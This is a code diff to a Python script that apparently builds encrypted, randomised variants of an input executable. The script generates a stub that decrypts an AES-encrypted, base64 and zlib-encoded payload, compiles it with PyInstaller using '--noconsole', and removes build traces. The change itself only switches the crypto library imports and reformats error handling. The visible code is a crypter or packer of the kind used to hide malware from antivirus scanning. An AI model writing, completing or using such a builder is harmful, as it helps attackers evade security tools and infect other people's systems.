@@ -1,6 +1,6 @@
 import os, base64, zlib, random, string, tempfile, subprocess, sys
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
 
 def random_id(length=12):
     return ''.join(random.choice(string.ascii_letters) for _ in range(length))
@@ -22,8 +22,8 @@ def build_variant(input_exe, output_name):
 
     stub = f"""
 import base64, zlib, tempfile, subprocess, os, sys
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import unpad
 
 def {func}():
     key = base64.b64decode({key_b64!r})
@@ -60,8 +60,10 @@ def {rebuilder}():
     subprocess.call(f"pyinstaller --onefile --noconsole {pyfile}", shell=True)
 
     os.remove(pyfile)
-    try: os.remove(output_name + ".spec")
-    except: pass
+    try:
+        os.remove(output_name + ".spec")
+    except:
+        pass
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
